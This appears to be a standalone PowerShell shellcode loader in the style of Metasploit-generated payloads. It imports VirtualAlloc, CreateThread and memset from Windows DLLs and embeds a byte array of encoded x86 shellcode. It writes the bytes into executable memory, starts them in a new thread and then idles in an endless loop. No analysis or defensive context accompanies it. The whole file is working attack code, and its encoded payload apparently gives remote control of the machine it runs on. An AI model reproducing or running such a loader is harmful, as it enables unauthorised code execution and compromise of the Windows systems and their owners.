$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x18,0xbd,0x42,0x63,0xda,0xcc,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x4b,0x31,0x42,0x15,0x83,0xc2,0x04,0x03,0x42,0x11,0xe2,0xed,0x41,0xaa,0xe1,0x0d,0xba,0x2b,0x86,0x84,0x5f,0x1a,0x86,0xf2,0x14,0x0d,0x36,0x71,0x78,0xa2,0xbd,0xd7,0x69,0x31,0xb3,0xff,0x9e,0xf2,0x7e,0xd9,0x91,0x03,0xd2,0x19,0xb3,0x87,0x29,0x4d,0x13,0xb9,0xe1,0x80,0x52,0xfe,0x1c,0x68,0x06,0x57,0x6a,0xde,0xb7,0xdc,0x26,0xe2,0x3c,0xae,0xa7,0x62,0xa0,0x67,0xc9,0x43,0x77,0xf3,0x90,0x43,0x79,0xd0,0xa8,0xca,0x61,0x35,0x94,0x85,0x1a,0x8d,0x62,0x14,0xcb,0xdf,0x8b,0xba,0x32,0xd0,0x79,0xc3,0x73,0xd7,0x61,0xb6,0x8d,0x2b,0x1f,0xc0,0x49,0x51,0xfb,0x45,0x4a,0xf1,0x88,0xfd,0xb6,0x03,0x5c,0x9b,0x3d,0x0f,0x29,0xe8,0x1a,0x0c,0xac,0x3d,0x11,0x28,0x25,0xc0,0xf6,0xb8,0x7d,0xe6,0xd2,0xe1,0x26,0x87,0x43,0x4c,0x88,0xb8,0x94,0x2f,0x75,0x1c,0xde,0xc2,0x62,0x2d,0xbd,0x8a,0x47,0x1f,0x3e,0x4b,0xc0,0x28,0x4d,0x79,0x4f,0x82,0xd9,0x31,0x18,0x0c,0x1d,0x35,0x33,0xe8,0xb1,0xc8,0xbc,0x08,0x9b,0x0e,0xe8,0x58,0xb3,0xa7,0x91,0x33,0x43,0x47,0x44,0x93,0x13,0xe7,0x37,0x53,0xc4,0x47,0xe8,0x3b,0x0e,0x48,0xd7,0x5b,0x31,0x82,0x70,0xf1,0xcb,0x45,0xbf,0xad,0xd5,0xf0,0x57,0xaf,0xd5,0xeb,0xfb,0x26,0x33,0x61,0x14,0x6e,0xeb,0x1e,0x8d,0x2b,0x67,0xbe,0x52,0xe6,0x0d,0x80,0xd9,0x02,0xf1,0x4f,0x2a,0x67,0xe1,0xb8,0x15,0x87,0xf9,0x38,0x00,0x87,0x93,0x3c,0x82,0xd0,0x0b,0x3f,0xf3,0x16,0x94,0xc0,0xd6,0x25,0xd3,0x3f,0xa7,0xc0,0xaf,0x76,0x3d,0x52,0xd8,0x76,0xd1,0x52,0x18,0x21,0xbb,0x52,0x70,0x95,0x9f,0x01,0x65,0xda,0x35,0x36,0x36,0x4f,0xb6,0x6e,0xea,0xd8,0xde,0x8c,0xd5,0x2f,0x41,0x6f,0x30,0x2c,0x86,0x8f,0xc5,0xf0,0x76,0x4c,0x10,0x31,0x0d,0xbb,0xa0,0x06,0x1e,0x8e,0x85,0x2f,0xb5,0xf0,0x9a,0x30,0x9c;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
